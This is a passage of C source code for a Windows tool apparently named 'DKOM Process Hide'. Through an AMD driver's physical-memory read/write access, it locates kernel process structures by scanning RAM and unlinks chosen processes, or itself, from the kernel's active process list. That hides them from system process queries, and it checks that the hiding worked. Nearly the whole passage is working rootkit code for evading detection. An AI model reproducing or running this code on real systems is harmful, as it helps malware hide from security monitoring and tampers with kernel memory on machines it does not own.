                        }
                        uint64_t bl_off = fl_off + 8;
                        if (bl_off + 8 <= csz)
                            memcpy(&blink, chunk + bl_off, 8);
                        else {
                            uint8_t bb[8];
                            if (phys_read(eproc_pa + ep->ActiveProcessLinks + 8, bb, 8))
                                memcpy(&blink, bb, 8);
                        }
                    }

                    if ((flink >> 48) != 0xFFFF) continue; /* must be kernel VA */

                    /* Valid EPROCESS — confirm layout and add to map */
                    if (g_layout < 0) g_layout = li;
                    eproc_map_add(eproc_pa, flink, blink);

                    /* Set target only once (first/correct match) */
                    if (pid_val == (uint32_t)target_pid && !target_pa_found) {
                        printf("\n    [Method C] Found PA=0x%016" PRIX64 " layout=%d\n",
                               eproc_pa, li);
                        target_pa_found = eproc_pa;
                    }
                    break; /* one layout per string occurrence is enough */
                }
            }
        }
    }

    if (target_pa_found) return target_pa_found;
    printf("\n    [Method C] Not found\n");
    return 0;
}

/* ── Find System (PID=4) EPROCESS via physical scan (for layout detect) ── */
static uint64_t find_system_eproc_pa(void) {
    static uint8_t chunk[0x40000];
    const uint32_t CHUNK = sizeof chunk;
    const char *sname = "System";
    const char fc = sname[0];

    printf("  [*] Finding System EPROCESS (layout detection)...\n");

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rbase = g_ranges[ri].base;
        uint64_t rend  = g_ranges[ri].base + g_ranges[ri].size;
        /* System EPROCESS is always in low memory — stop at 256MB */
        if (rbase >= 0x10000000ULL) continue;
        uint64_t scan_end = rend < 0x10000000ULL ? rend : 0x10000000ULL;

        for (uint64_t cpa = rbase; cpa < scan_end; cpa += CHUNK) {
            uint64_t csz = scan_end - cpa;
            if (csz > CHUNK) csz = CHUNK;
            if (!phys_read(cpa, chunk, (uint32_t)csz)) continue;

            for (uint64_t off = 0; off + 6 <= csz; off++) {
                if (chunk[off] != (uint8_t)fc) continue;
                if (strncmp((char*)(chunk+off), "System", 6) != 0) continue;

                for (int li = 0; li < (int)N_LAYOUTS; li++) {
                    const EP_OFFSETS *ep = (const EP_OFFSETS*)&g_scan_layouts[li];
                    if (off < ep->ImageFileName) continue;
                    uint64_t eproc_pa = cpa + off - ep->ImageFileName;

                    uint64_t pid_off = off - ep->ImageFileName + ep->UniqueProcessId;
                    if (pid_off + 4 > csz) continue;
                    uint32_t pid_val;
                    memcpy(&pid_val, chunk + pid_off, 4);
                    if (pid_val != 4) continue;

                    uint64_t fl_off = off - ep->ImageFileName + ep->ActiveProcessLinks;
                    if (fl_off + 8 > csz) continue;
                    uint64_t flink;
                    memcpy(&flink, chunk + fl_off, 8);
                    if ((flink >> 48) != 0xFFFF) continue;

                    printf("  [+] System EPROCESS PA=0x%016" PRIX64 " layout=%d\n",
                           eproc_pa, li);
                    g_layout = li;
                    return eproc_pa;
                }
            }
        }
    }
    return 0;
}

/* ── Physical scan for a specific 8-byte value ──────────────────────── */

/* Scan all physical ranges for QWORD == value, stride-8 (aligned).
 * Fills out[] with up to max_out matching PAs. Returns count found. */
static int scan_for_qword(uint64_t value, uint64_t *out, int max_out) {
    static uint8_t chunk[0x40000]; /* 256KB */
    static uint8_t page_buf[0x1000];
    const uint32_t CHUNK = sizeof chunk;
    int found = 0;
    uint64_t print_next = 0;

    printf("  [*] Scanning RAM for 0x%016" PRIX64 " ...\n", value);

    for (int ri = 0; ri < g_nranges && found < max_out; ri++) {
        uint64_t rbase = g_ranges[ri].base;
        uint64_t rend  = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = rbase; cpa < rend && found < max_out; cpa += CHUNK) {
            if (cpa >= print_next) {
                printf("\r  [scan] [%4" PRIu64 "MB / %4" PRIu64 "MB] found=%d  ",
                       cpa >> 20, rend >> 20, found);
                fflush(stdout);
                print_next = cpa + (512ULL << 20);
            }
            uint64_t csz = rend - cpa < CHUNK ? rend - cpa : CHUNK;
            if (!phys_read(cpa, chunk, (uint32_t)csz)) {
                memset(chunk, 0, (size_t)csz);
                int any = 0;
                for (uint64_t pg = 0; pg < csz; pg += 0x1000) {
                    uint32_t psz = csz - pg < 0x1000 ? (uint32_t)(csz - pg) : 0x1000;
                    if (phys_read(cpa + pg, page_buf, psz)) {
                        memcpy(chunk + pg, page_buf, psz);
                        any = 1;
                    }
                }
                if (!any) continue;
            }
            /* Stride-8: LIST_ENTRY fields are always 8-byte aligned */
            for (uint64_t off = 0; off + 8 <= csz; off += 8) {
                uint64_t v;
                memcpy(&v, chunk + off, 8);
                if (v == value) {
                    out[found++] = cpa + off;
                    if (found >= max_out) goto done;
                }
            }
        }
    }
done:
    printf("\r  [scan] done — found %d match(es) for 0x%016" PRIX64 "\n",
           found, value);
    return found;
}

/* Get EPROCESS KVA from system handle table for a given PID.
 * Works even when page walk / kva_to_pa fails (Hyper-V). */
static uint64_t get_eproc_kva_from_handles(DWORD target_pid) {
    if (!NtQSI) return 0;
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProc) return 0;

    ULONG buf_size = 0x100000;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS st = (NTSTATUS)-1;
    for (int t = 0; t < 8; t++) {
        free(shi);
        shi = (SYSTEM_HANDLE_INFORMATION*)malloc(buf_size);
        if (!shi) break;
        ULONG rl = 0;
        st = NtQSI(SystemHandleInformation, shi, buf_size, &rl);
        if (st == 0) break;
        buf_size *= 2;
    }

    uint64_t kva = 0;
    if (shi && st == 0) {
        DWORD my_pid = GetCurrentProcessId();
        for (ULONG i = 0; i < shi->Count; i++) {
            if (shi->Handles[i].ProcessId == my_pid &&
                (HANDLE)(uintptr_t)shi->Handles[i].Handle == hProc) {
                kva = (uint64_t)(uintptr_t)shi->Handles[i].Object;
                break;
            }
        }
    }
    free(shi);
    CloseHandle(hProc);
    return kva;
}

/* ── DKOM: Unlink + Restore ─────────────────────────────────────────── */
typedef struct {
    uint64_t eproc_pa;       /* PA of target EPROCESS */
    uint64_t links_pa;       /* PA of ActiveProcessLinks in EPROCESS */
    uint64_t saved_flink_kva;
    uint64_t saved_blink_kva;
    uint64_t flink_blink_pa; /* PA of next.Blink field */
    uint64_t blink_flink_pa; /* PA of prev.Flink field */
    uint64_t our_links_kva;  /* KVA of our ActiveProcessLinks — for restore */
    int      unlinked;
} DkomState;

#define MAX_TARGETS 32
static DkomState g_dkom[MAX_TARGETS];
static int       g_ndkom = 0;

/*
 * dkom_unlink_v3 — works on both physical machines and Hyper-V guests.
 *
 * Fast path  (physical machine): page walk → flink_pa, blink_pa
 * Fallback   (Hyper-V / SLAT):   scan physical RAM for our_links_kva
 *
 * Distinguisher for scan results:
 *   In EPROCESS, UniqueProcessId is at off_flink - 8 for ALL layouts.
 *   → at (prev.Flink PA - 8): small PID value  (not a kernel VA)
 *   → at (next.Blink PA - 8): next.Flink KVA   (0xFFFF... high bits)
 *   This is 100% reliable across all Win10/11 EPROCESS layouts.
 */
static int dkom_unlink_v3(uint64_t eproc_pa, uint64_t eproc_kva, DkomState *out) {
    static EP_OFFSETS ep_buf;
    if (g_ep.ActiveProcessLinks) {
        ep_buf = g_ep;
    } else if (g_layout >= 0 && (uint32_t)g_layout < g_n_scan_layouts) {
        ep_buf = g_scan_layouts[g_layout];
    } else {
        printf("  [!] No EPROCESS offsets available\n"); return 0;
    }
    const EP_OFFSETS *ep = &ep_buf;
    uint64_t links_pa  = eproc_pa + ep->ActiveProcessLinks;
    uint64_t links_kva = eproc_kva ? (eproc_kva + ep->ActiveProcessLinks) : 0;

    uint64_t flink_kva = rd8(links_pa);
    uint64_t blink_kva = rd8(links_pa + 8);

    if (!flink_kva || (flink_kva >> 48) != 0xFFFF ||
        !blink_kva || (blink_kva >> 48) != 0xFFFF) {
        printf("  [!] Invalid Flink/Blink (not kernel VAs)\n");
        return 0;
    }

    printf("  [*] our links_kva  = 0x%016" PRIX64 "\n", links_kva);
    printf("  [*] Flink KVA      = 0x%016" PRIX64 "\n", flink_kva);
    printf("  [*] Blink KVA      = 0x%016" PRIX64 "\n", blink_kva);

    uint64_t prev_flink_pa = 0;
    uint64_t next_blink_pa = 0;

    /* ── Fast path 1: page walk (physical machine, no SLAT) ── */
    if (g_kernel_cr3) {
        uint64_t flink_pa = kva_to_pa_cr3(flink_kva, g_kernel_cr3);
        uint64_t blink_pa = kva_to_pa_cr3(blink_kva, g_kernel_cr3);
        if (flink_pa && blink_pa) {
            prev_flink_pa = blink_pa;
            next_blink_pa = flink_pa + 8;
            printf("  [+] PA via page walk: prev.Flink=0x%016"PRIX64
                   "  next.Blink=0x%016"PRIX64"\n", prev_flink_pa, next_blink_pa);
        }
    }

    /* ── Fast path 2: EPROCESS map lookup (populated during Method C scan) ── */
    if ((!prev_flink_pa || !next_blink_pa) && links_kva && g_eproc_map_n > 0) {
        printf("  [*] Page walk failed — trying EPROCESS map (%d entries)...\n",
               g_eproc_map_n);
        if (!prev_flink_pa) {
            prev_flink_pa = map_find_prev_flink_pa(links_kva);
            if (prev_flink_pa)
                printf("  [+] Map: prev.Flink PA = 0x%016"PRIX64"\n", prev_flink_pa);
        }
        if (!next_blink_pa) {
            next_blink_pa = map_find_next_blink_pa(links_kva);
            if (next_blink_pa)
                printf("  [+] Map: next.Blink PA = 0x%016"PRIX64"\n", next_blink_pa);
        }
    }

    /* ── Fallback: scan RAM for our_links_kva (unreliable if page not readable) ── */
    if ((!prev_flink_pa || !next_blink_pa) && links_kva) {
        printf("  [*] Map miss — scanning RAM for our_links_kva as last resort\n");
        uint64_t matches[8] = {0};
        int n = scan_for_qword(links_kva, matches, 8);

        for (int i = 0; i < n; i++) {
            uint64_t pa = matches[i];

            uint64_t before = (pa >= 8) ? rd8(pa - 8) : 0;
            uint64_t after  = rd8(pa + 8);

            /* LIST_ENTRY Flink/Blink must be 8-byte aligned kernel VAs.
             * Bit-0 set or non-0xFFFF prefix → not a valid LIST_ENTRY pointer. */
            int before_is_kva = (before >> 48) == 0xFFFF && (before & 7) == 0;
            int after_is_kva  = (after  >> 48) == 0xFFFF && (after  & 7) == 0;
            int before_is_pid = (before > 0) && (before < 0x10000) &&
                                 ((before & 3) == 0);

            int is_prev_flink = before_is_pid && after_is_kva;
            int is_next_blink = before_is_kva;

            printf("  [*] match[%d] PA=0x%016"PRIX64
                   "  before=0x%016"PRIX64"  after=0x%016"PRIX64"  %s\n",
                   i, pa, before, after,
                   (!is_prev_flink && !is_next_blink) ? "SKIP" :
                   is_next_blink ? "next.Blink" : "prev.Flink");

            if (!is_prev_flink && !is_next_blink) continue;

            /* Scan ALWAYS overrides map for prev.Flink.
             * For next.Blink, take first valid (map or scan).
             * No early break — scan all matches to ensure correct result. */
            if (is_prev_flink)
                prev_flink_pa = pa;
            if (is_next_blink && !next_blink_pa)
                next_blink_pa = pa;
        }
    } else if (!links_kva) {
        printf("  [!] No EPROCESS KVA — cannot scan for our_links_kva\n");
        printf("  [!] Hint: run as SYSTEM or make sure SeDebugPrivilege is enabled\n");
        return 0;
    }

    if (!prev_flink_pa || !next_blink_pa) {
        printf("  [!] Could not locate prev.Flink PA (0x%016"PRIX64") or "
               "next.Blink PA (0x%016"PRIX64")\n", prev_flink_pa, next_blink_pa);
        return 0;
    }

    printf("  [+] prev.Flink PA = 0x%016" PRIX64 "\n", prev_flink_pa);
    printf("  [+] next.Blink PA = 0x%016" PRIX64 "\n", next_blink_pa);

    /* Save state for restore */
    out->eproc_pa        = eproc_pa;
    out->links_pa        = links_pa;
    out->saved_flink_kva = flink_kva;
    out->saved_blink_kva = blink_kva;
    out->blink_flink_pa  = prev_flink_pa;
    out->flink_blink_pa  = next_blink_pa;
    out->our_links_kva   = links_kva;

    /* Perform unlink:
     *   prev.Flink = flink_kva  (prev now points to next, skipping us)
     *   next.Blink = blink_kva  (next now points to prev, skipping us)  */
    if (!phys_write(prev_flink_pa, &flink_kva, 8)) {
        printf("  [!] Write prev.Flink failed\n");
        return 0;
    }
    if (!phys_write(next_blink_pa, &blink_kva, 8)) {
        printf("  [!] Write next.Blink failed — restoring prev.Flink\n");
        phys_write(prev_flink_pa, &links_kva, 8);
        return 0;
    }

    out->unlinked = 1;
    hidden_add(eproc_pa); /* mark this EPROCESS as hidden for map filtering */

    /* Update map: prev's Flink and next's Blink changed in physical memory.
     * Without this, subsequent targets may pick stale map entries. */
    eproc_map_update_after_dkom(prev_flink_pa, next_blink_pa, flink_kva, blink_kva);

    printf("  [+] DKOM unlink OK — process invisible\n");
    return 1;
}

static void dkom_restore_one(DkomState *s) {
    if (!s->unlinked) return;
    if (s->our_links_kva) {
        phys_write(s->blink_flink_pa, &s->our_links_kva, 8);
        phys_write(s->flink_blink_pa, &s->our_links_kva, 8);
        phys_write(s->links_pa,       &s->saved_flink_kva, 8);
        phys_write(s->links_pa + 8,   &s->saved_blink_kva, 8);
    }
    s->unlinked = 0;
}

static void dkom_restore_all(void) {
    int restored = 0;
    /* Restore in reverse order (last hidden → first restored) */
    for (int i = g_ndkom - 1; i >= 0; i--) {
        if (g_dkom[i].unlinked) {
            dkom_restore_one(&g_dkom[i]);
            restored++;
        }
    }
    if (restored)
        printf("[+] Restored %d process(es) — all visible again\n", restored);
}

/* ── Ctrl+C handler ─────────────────────────────────────────────────── */
static BOOL WINAPI ctrl_handler(DWORD type) {
    (void)type;
    printf("\n[Ctrl+C] Restoring all...\n");
    dkom_restore_all();
    return FALSE;
}

/* ── Verify hide worked ─────────────────────────────────────────────── */
static void verify_hidden(DWORD target_pid) {
    printf("  [*] Verifying via NtQuerySystemInformation...\n");
    if (!NtQSI) return;
    uint8_t *buf = (uint8_t*)malloc(0x400000);
    if (!buf) return;
    ULONG ret_len = 0;
    /* SystemProcessInformation = 5 */
    NTSTATUS st = NtQSI(5, buf, 0x400000, &ret_len);
    if (st != 0) { free(buf); return; }

    /* Walk SYSTEM_PROCESS_INFORMATION structures */
    uint8_t *ptr = buf;
    int found = 0;
    while (1) {
        ULONG off_next;
        memcpy(&off_next, ptr, 4);
        ULONG uni_pid;
        memcpy(&uni_pid, ptr + 0x50, 4); /* UniqueProcessId at +0x50 on x64 */
        if ((DWORD)uni_pid == target_pid) { found = 1; break; }
        if (!off_next) break;
        ptr += off_next;
    }
    free(buf);

    if (!found)
        printf("  [+] Verified: PID %lu NOT in NtQuerySystemInformation list ✓\n", target_pid);
    else
        printf("  [!] Still visible in NtQuerySystemInformation — DKOM may have failed\n");
}

/* ── Per-target info ─────────────────────────────────────────────────── */
typedef struct {
    DWORD    pid;
    char     name[64];
} Target;

static uint64_t find_eprocess_pa(DWORD pid, const char *name,
                                   uint64_t system_eproc_pa) {
    uint64_t pa = 0;
    if (g_kernel_cr3 && g_ep.ActiveProcessLinks)
        pa = eproc_via_handle(pid, name);
    if (!pa && g_kernel_cr3 && system_eproc_pa && g_ep.ActiveProcessLinks)
        pa = eproc_via_list_walk(pid, name, system_eproc_pa);
    if (!pa)
        pa = eproc_via_phys_scan(pid, name);
    return pa;
}

/* ── main ──────────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    printf("+------------------------------------------+\n");
    printf("|  DKOM Process Hide — AMD Ryzen R/W       |\n");
    printf("|  Usage: dkom_hide.exe [PID|name] ...     |\n");
    printf("|  (no args = hide self)                   |\n");
    printf("+------------------------------------------+\n\n");

    /* ── Parse targets ── */
    Target targets[MAX_TARGETS];
    int    ntargets   = 0;
    int    hide_self  = 0;

    if (argc < 2) {
        targets[0].pid = GetCurrentProcessId();
        targets[0].name[0] = 0;
        ntargets  = 1;
        hide_self = 1;
    } else {
        for (int i = 1; i < argc && ntargets < MAX_TARGETS; i++) {
            char *end;
            long val = strtol(argv[i], &end, 10);
            DWORD  pid  = 0;
            char   name[64] = {0};
            if (*end == 0 && val > 0) {
                pid = (DWORD)val;
            } else {
                strncpy(name, argv[i], sizeof(name)-1);
                pid = name_to_pid(name);
                if (!pid) {
                    printf("[!] Process '%s' not found — skipping\n", name);
                    continue;
                }
            }
            if (!name[0] && !pid_to_name(pid, name, sizeof name)) {
                printf("[!] Could not resolve name for PID %lu — skipping\n", pid);
                continue;
            }
            targets[ntargets].pid = pid;
            strncpy(targets[ntargets].name, name, sizeof(targets[0].name)-1);
            ntargets++;
        }
    }

    if (!ntargets) {
        printf("[!] No valid targets.\n");
        return 1;
    }

    printf("[*] Targets (%d):\n", ntargets);
    for (int i = 0; i < ntargets; i++)
        printf("    [%d] PID=%-6lu  %s\n", i, targets[i].pid, targets[i].name);
    printf("\n");

    /* ── Init ── */
    NtQSI = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                      "NtQuerySystemInformation");

    if (!drv_open()) {
        printf("[!] Cannot open AMD driver (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] AMD driver opened\n");

    load_phys_ranges();

    g_kernel_cr3 = find_kernel_cr3_with_ntos();
    printf(g_kernel_cr3 ? "[+] Kernel CR3 = 0x%016" PRIX64 "\n"
                        : "[!] Kernel CR3 not found\n", g_kernel_cr3);

    uint64_t system_eproc_pa = find_system_eproc_pa();
    printf("\n");

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* ── Process each target ── */
    int n_ok = 0;
    for (int ti = 0; ti < ntargets; ti++) {
        DWORD  pid  = targets[ti].pid;
        char  *name = targets[ti].name;

        printf("━━━ [%d/%d] PID=%-6lu  %s ━━━\n", ti+1, ntargets, pid, name);

        /* Find EPROCESS PA */
        uint64_t eproc_pa = find_eprocess_pa(pid, name, system_eproc_pa);
        if (!eproc_pa) {
            printf("  [!] EPROCESS not found — skipping\n\n");
            continue;
        }
        printf("  [+] EPROCESS PA = 0x%016" PRIX64 "\n", eproc_pa);

        /* Resolve offsets dynamically (first target populates g_ep,
         * subsequent targets reuse it — same Windows build) */
        if (!g_ep.ActiveProcessLinks) {
            if (!resolve_eprocess_offsets(eproc_pa, pid, name, &g_ep)) {
                printf("  [!] Offset resolution failed — using static layout\n");
                if (g_layout >= 0 && (uint32_t)g_layout < g_n_scan_layouts)
                    g_ep = *(EP_OFFSETS*)&g_scan_layouts[g_layout];
                else { printf("  [!] No layout. Skipping.\n\n"); continue; }
            }
        }

        /* Get EPROCESS KVA from handle table */
        uint64_t eproc_kva = get_eproc_kva_from_handles(pid);
        if (eproc_kva)
            printf("  [+] EPROCESS KVA = 0x%016" PRIX64 "\n", eproc_kva);
        else
            printf("  [!] No EPROCESS KVA — restore unavailable for this target\n");

        /* DKOM unlink */
        if (g_ndkom >= MAX_TARGETS) {
            printf("  [!] Target array full (%d). Skipping.\n\n", MAX_TARGETS);
            continue;
        }
        memset(&g_dkom[g_ndkom], 0, sizeof g_dkom[0]);
        if (dkom_unlink_v3(eproc_pa, eproc_kva, &g_dkom[g_ndkom])) {
            g_ndkom++;
            n_ok++;
            verify_hidden(pid);
        } else {
            printf("  [!] DKOM failed for PID %lu\n", pid);
        }
        printf("\n");
    }

    if (!n_ok) {
        printf("[!] No processes were hidden.\n");
        CloseHandle(g_drv);
        return 1;
    }

    printf("[+] Hidden %d / %d process(es). Press ENTER to restore all...\n",
           n_ok, ntargets);
    if (hide_self)
        printf("    (Hiding self — use Ctrl+C if ENTER doesn't respond)\n");

    getchar();

    dkom_restore_all();

    CloseHandle(g_drv);
    printf("[+] Done\n");
    return 0;
}
